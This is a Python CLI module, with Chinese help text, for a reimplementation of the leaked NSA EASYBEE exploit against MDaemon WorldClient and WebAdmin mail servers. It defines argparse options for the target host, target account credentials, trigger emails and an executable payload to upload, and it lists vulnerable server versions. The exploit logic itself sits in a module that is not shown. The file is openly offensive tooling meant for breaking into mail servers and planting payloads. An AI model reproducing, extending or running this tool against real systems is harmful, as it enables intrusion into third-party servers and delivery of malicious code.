"""easybee — EASYBEE MDaemon WorldClient 远程利用。

Python 重写的 NSA Easybee 工具 `Easybee-1.0.1.exe`
(C++ / DAVE framework)，通过 IDA Pro / x32dbg 逆向恢复。
实现了该工具的 key=value 参数接口及其 MDaemon WorldClient 利用流程。
"""

from . import easybee


# ---------------------------------------------------------------------------
# Subcommand entrypoint.
# ---------------------------------------------------------------------------
def easybee_handle(args):
    """Run the EASYBEE exploitation sequence against the supplied host."""
    return easybee.run_function(
        target=args.target,
        world_client_port=args.world_client_port,
        web_admin_port=args.web_admin_port,
        timeout=args.timeout,
        world_client_protocol=args.world_client_protocol,
        world_client_domain=args.world_client_domain,
        web_admin_protocol=args.web_admin_protocol,
        target_acct_domain=args.target_acct_domain,
        target_acct_usr=args.target_acct_usr,
        target_acct_pwd=args.target_acct_pwd,
        target_acct_is_admin=args.target_acct_is_admin,
        cf_email_from=args.cf_email_from,
        cf_email_subj=args.cf_email_subj,
        cf_email_file=args.cf_email_file,
        ar_email_from=args.ar_email_from,
        ar_email_subj=args.ar_email_subj,
        pt_email_from=args.pt_email_from,
        pt_email_subj=args.pt_email_subj,
        payload_name=args.payload_name,
        payload_file=args.payload_file,
        world_client_version=args.world_client_version,
        verbose=args.verbose,
    )


def reg_subparser(subparsers):
    """Register the `easybee` subcommand on an argparse
    subparsers group."""
    p = subparsers.add_parser(
        "easybee",
        help="EASYBEE MDaemon WorldClient 远程利用",
        description="Python 重写的 NSA Easybee (EASYBEE) MDaemon WorldClient "
                    "远程利用工具 Easybee-1.0.1。针对 MDaemon WorldClient 和 "
                    "WebAdmin 服务器，执行内容过滤触发和自动回复触发攻击。",
    )
    p.add_argument(
        "target", metavar="TARGET",
        help="目标主机名或 IP",
    )
    p.add_argument(
        "--world-client-port", type=int, metavar="PORT",
        help="WorldClient 端口号",
    )
    p.add_argument(
        "--web-admin-port", type=int, metavar="PORT",
        help="WebAdmin 端口号",
    )
    p.add_argument(
        "--timeout", type=int, default=60,
        help="阻塞网络调用超时秒（-1 表示无超时，默认 60）",
    )
    p.add_argument(
        "--world-client-protocol",
        choices=["http", "https"],
        help="WorldClient 协议（http/https）",
    )
    p.add_argument(
        "--world-client-domain", metavar="DOMAIN",
        help="WorldClient 地址（域名或 IP）",
    )
    p.add_argument(
        "--web-admin-protocol",
        choices=["http", "https"],
        help="WebAdmin 协议（http/https）",
    )
    p.add_argument(
        "--web-admin-domain", metavar="DOMAIN",
        help="WebAdmin 地址（域名或 IP）",
    )
    p.add_argument(
        "--target-acct-domain", metavar="DOMAIN",
        help="目标账户邮件域",
    )
    p.add_argument(
        "--target-acct-usr", metavar="USER",
        help="目标账户用户名",
    )
    p.add_argument(
        "--target-acct-pwd", metavar="PASS",
        help="目标账户密码",
    )
    p.add_argument(
        "--target-acct-is-admin", metavar="BOOL",
        help="目标账户管理员状态",
    )
    p.add_argument(
        "--cf-email-from", metavar="FROM",
        help="内容过滤触发邮件发件人",
    )
    p.add_argument(
        "--cf-email-subj", metavar="SUBJ",
        help="内容过滤触发邮件主题",
    )
    p.add_argument(
        "--cf-email-file", metavar="FILE",
        help="内容过滤触发邮件附件（可执行载荷）文件名",
    )
    p.add_argument(
        "--ar-email-from", metavar="FROM",
        help="自动回复触发邮件发件人",
    )
    p.add_argument(
        "--ar-email-subj", metavar="SUBJ",
        help="自动回复触发邮件主题",
    )
    p.add_argument(
        "--pt-email-from", metavar="FROM",
        help="未触发过滤/自动回复邮件发件人",
    )
    p.add_argument(
        "--pt-email-subj", metavar="SUBJ",
        help="未触发过滤/自动回复邮件主题",
    )
    p.add_argument(
        "--payload-name", metavar="NAME",
        help="目标上载荷文件名",
    )
    p.add_argument(
        "--payload-file", metavar="FILE",
        help="要上传到目标的载荷文件路径",
    )
    p.add_argument(
        "--world-client-version",
        choices=["9.5.2", "9.6.0", "9.6.1", "9.6.2", "9.6.3", "9.6.4", "9.6.5",
                 "9.6.6", "10.0.1", "10.0.2", "10.0.3", "10.0.4", "10.0.5",
                 "10.1.0", "10.1.1", "10.1.2"],
        help="目标 WorldClient 版本",
    )
    p.add_argument(
        "-v", "--verbose", action="store_true",
        help="输出参数与调试信息",
    )
    p.set_defaults(func=easybee_handle)
